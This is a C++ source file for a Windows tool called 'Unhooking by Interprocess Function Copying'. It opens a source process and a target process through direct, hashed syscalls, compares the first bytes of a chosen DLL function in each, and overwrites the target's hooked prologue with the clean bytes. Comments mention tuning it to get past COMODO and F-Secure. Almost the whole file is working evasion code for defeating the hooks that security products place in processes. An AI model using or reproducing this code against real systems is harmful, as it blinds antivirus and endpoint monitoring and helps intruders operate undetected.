#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include "InterProcessFunctionCopying.h"
#include <DbgHelp.h>
#include <string>
#include "sysc_sw2.h"

#pragma comment (lib, "Dbghelp.lib")

#define bytesToCompare 16

#define SW2_SEED 0x874DD416
#define SW2_ROL8(v) (v << 8 | v >> 24)
#define SW2_ROR8(v) (v >> 8 | v << 24)
#define SW2_ROX8(v) ((SW2_SEED % 2) ? SW2_ROL8(v) : SW2_ROR8(v))
#define SW2_MAX_ENTRIES 3200 //BRS was 500
#define SW2_RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)

DWORD SW2_HashSyscall(PCSTR FunctionName);

typedef struct _SW2_PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} SW2_PEB_LDR_DATA, * PSW2_PEB_LDR_DATA;

typedef struct _SW2_PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PSW2_PEB_LDR_DATA Ldr;
} SW2_PEB, * PSW2_PEB;

typedef struct _SW2_LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
} SW2_LDR_DATA_TABLE_ENTRY, * PSW2_LDR_DATA_TABLE_ENTRY;

typedef struct _SW2_SYSCALL_ENTRY
{
	DWORD Hash;
	DWORD Address;
} SW2_SYSCALL_ENTRY, * PSW2_SYSCALL_ENTRY;

typedef struct _SW2_SYSCALL_LIST
{
	DWORD Count;
	SW2_SYSCALL_ENTRY Entries[SW2_MAX_ENTRIES];
} SW2_SYSCALL_LIST, * PSW2_SYSCALL_LIST;


SW2_SYSCALL_LIST SW2_SyscallList;




DWORD SW2_HashSyscall(PCSTR FunctionName)
{
	DWORD i = 0;
	DWORD Hash = SW2_SEED;

	while (FunctionName[i])
	{
		WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
		Hash ^= PartialName + SW2_ROR8(Hash);
	}

	return Hash;
}

//TODO: find ntdll using assembly: https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode


//TODO: NtDll.dll only at this moment, fixed method name
int unhook(DWORD sourcePid, DWORD targetPid, LPCWSTR dllName, LPCSTR methodName)
{
	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(dllName), methodName);
	printf("Address of %s: %p\n\n", methodName,lpProcAddress);
	printf("Reading source and target...\n");

	//Aanpassing voor COMODO, werkte al wel in F-Sec
	//Was: HANDLE processHandleTarget = OpenProcess(SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, FALSE, targetPid);
	//	   HANDLE processHandleSource = OpenProcess(SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, FALSE, sourcePid);
	
	//Open process using syscalls
	HANDLE processHandleTarget = NULL;
	OBJECT_ATTRIBUTES ObjectAttributesTarget;
	InitializeObjectAttributes(&ObjectAttributesTarget, NULL, 0, NULL, NULL);
	CLIENT_ID uPidTarget = { 0 };
	uPidTarget.UniqueProcess = (HANDLE)targetPid;
	uPidTarget.UniqueThread = (HANDLE)0;
	NTSTATUS statusOpenTarget = ZwOpenProcess10(&processHandleTarget, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, &ObjectAttributesTarget, &uPidTarget);

	//Open process using syscalls
	HANDLE processHandleSource = NULL;
	OBJECT_ATTRIBUTES ObjectAttributesSource;
	InitializeObjectAttributes(&ObjectAttributesSource, NULL, 0, NULL, NULL);
	CLIENT_ID uPidSource = { 0 };
	uPidSource.UniqueProcess = (HANDLE) sourcePid;
	uPidSource.UniqueThread = (HANDLE)0;
	NTSTATUS statusOpenSource = ZwOpenProcess10(&processHandleSource, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, &ObjectAttributesSource, &uPidSource);

	BYTE functionCodeTarget[bytesToCompare];
	BYTE functionCodeSource[bytesToCompare];

	SIZE_T lpNumberOfBytesReadTarget = 0;
	SIZE_T lpNumberOfBytesReadSource = 0;

	LPVOID lpBaseAddress = lpProcAddress;
	NTSTATUS status = NtReadVirtualMemory(processHandleTarget, lpBaseAddress, &functionCodeTarget, sizeof(functionCodeTarget), &lpNumberOfBytesReadTarget);
	if (!status == STATUS_SUCCESS)
	{
		printf("ERROR: Read error on target process method!");
		return -1;
	}
	status = NtReadVirtualMemory(processHandleSource, lpBaseAddress, &functionCodeSource, sizeof(functionCodeSource), &lpNumberOfBytesReadSource);
	if (!status == STATUS_SUCCESS)
	{
		printf("ERROR: Read error on source process method!");
		return -1;
	}

	if (lpNumberOfBytesReadTarget != lpNumberOfBytesReadSource)
	{
		printf("ERROR: Did not read equal amount of data!");
		return -1;
	}
	if (lpNumberOfBytesReadTarget == 0)
	{
		printf("ERROR: Did not read any data at all!");
		return -1;
	}
	//printf("Bytes read in both processes: %zu\n", lpNumberOfBytesReadSource);

	printf("Source function bytes: ");
	for (int i = 0; i < lpNumberOfBytesReadSource; i++)
		printf(" %02X", functionCodeSource[i]);

	printf("\nTarget function bytes: ");
	for (int i = 0; i < lpNumberOfBytesReadTarget; i++)
		printf(" %02X", functionCodeTarget[i]);

	printf("\n");
	LONG64 lastDifferenceIndex = -1;
	boolean similar = TRUE;
	for (LONG64 i = (LONG64)lpNumberOfBytesReadSource - 1; i > -1; i--)
	{
		if (functionCodeSource[i] != functionCodeTarget[i])
		{
			lastDifferenceIndex = i;
			similar = FALSE;
			break;
		}
	}

	if (similar)
	{
		printf("No differences found! --> Both hooked or not hooked (:\n");
	}
	else
	{
		printf("Differences found up to index: %zu\n", lastDifferenceIndex);
		printf("Fixing prologue of target...\n");
		SIZE_T lpNumberOfBytesWrittenTarget = 0;
		ULONG OldProtection, NewProtection;

		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
		ZwClose = &ZwClose10;
		
		SIZE_T uSize = (SIZE_T)(lastDifferenceIndex + 1);

		ZwClose(processHandleSource);

		status = ZwProtectVirtualMemory(processHandleTarget, &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
		if (!status == STATUS_SUCCESS)
		{
			printf("ERROR: ProtectVirtualMemory before writing!");
			return -1;
		}

		//Reset lpBaseAddress --> Without this no writing :)
		//TODO: weg?LPCSTR theMethodName = methodName;		
		LPVOID lpProcAddress = GetProcAddress(LoadLibrary(dllName), methodName);
		LPVOID lpBaseAddress = lpProcAddress;

		//uSize not working here.
		status = ZwWriteVirtualMemory(processHandleTarget,lpBaseAddress, (PVOID)functionCodeSource, (SIZE_T)(lastDifferenceIndex + 1), &lpNumberOfBytesWrittenTarget);
		if (!status == STATUS_SUCCESS)
		{
			printf("ERROR: ZwWriteVirtualMemory!");
			return -1;
		}

		status = ZwProtectVirtualMemory(processHandleTarget, &lpBaseAddress, &uSize, OldProtection, &NewProtection);
		if (!status == STATUS_SUCCESS)
		{
			printf("ERROR: ProtectVirtualMemory after writing!");
			return -1;
		}

		ZwClose(processHandleTarget);

		printf("Bytes written in target process: %zu\n", lpNumberOfBytesWrittenTarget);		
		printf("Patching process complete!\n");
	}

//	printf("\n");
//	printf("Press Any Key to Continue\n");
//	getchar();
	return 0;
}

int wmain(int argc, wchar_t* argv[]) {
		
	if (argc != 5)
	{
		printf("Supply source pid, target pid, dllname and methodname as arguments. \n");
		return -1;
	}

	DWORD sourcePid = _wtoi(argv[1]);
	DWORD targetPid = _wtoi(argv[2]);

	//Before generic solution:
	//LPCSTR methodName = "CreateRemoteThreadEx";
	//LPCWSTR dllName = L"kernelbase.dll";
	//Or: 
	//LPCSTR methodName = "ZwCreateFile";
	//LPCWSTR dllName = L"ntdll.dll";

	std::wstring wDll(argv[3]); //convert to wstring
	std::string sDll(wDll.begin(), wDll.end()); //and convert to string.
	LPCWSTR dllName = wDll.c_str();
	
	std::wstring wMethod(argv[4]); //convert to wstring
	std::string sMethod(wMethod.begin(), wMethod.end()); //and convert to string.
	LPCSTR methodName = (LPCSTR)sMethod.c_str();


	printf("\nUnhooking by Interprocess Function Copying (TM) \n\n");
	//printf("-~+[ Imagine fancy ASCII art here ]+~- \n\n");

	printf("                                ,w                      \n");
	printf("                              ,@*                       \n");
	printf("                    ,w,    ,@\"                            \n");                     
	printf("                    \"~w   gP                                 \n");                  
	printf("                         ,@` ww,                                 \n");
	printf("                        gP  '~=\"                                    \n");            
	printf("                    /@@@@r                                             \n");
	printf("                     $NM\",w~w,                                            \n");
	printf("                  - @\"  j-    $                                              \n");
	printf("    @K            gP     \"*~r\"`, ggN@MM & &&&MM & Nwg, \n");
	printf("  a]@\"          ,@`  w*\"*w   ,g@$|||@lllllllllllll||T$m,                  ,g@C  \n");
	printf("   ]P         gP`    N,,,A,@M||@llll@llllllllllllllllll|T&g,         ,g@M$@C    \n");
	printf("    @     ,g@\"          ,@$|ll$ Mll$|llll|lg@@@g||lllllllll||MNmgggMT|lly@      \n");
	printf("     \"***\"`              ]@ | lll | ll$ | llllll | TMNN@@@@@@lllllllllllllllllll@`      \n");
	printf("                           \"Bglll]Wlllllllllllllllllllllllllll|@@m@@glll%W      \n");
	printf("                             '*N@$lllllllllllllllllll||g@@NM*`       *N@|%w     \n");
	printf("                                  \"*RN@@@@@@@@@NRP*\"\"\"`                 *@@w    \n");
	printf("                                                                          \"\"  \n");

	printf("Source pid: %d\n\n", sourcePid);
	printf("Target pid: %d\n\n", targetPid);

	return unhook(sourcePid, targetPid, dllName,methodName);
}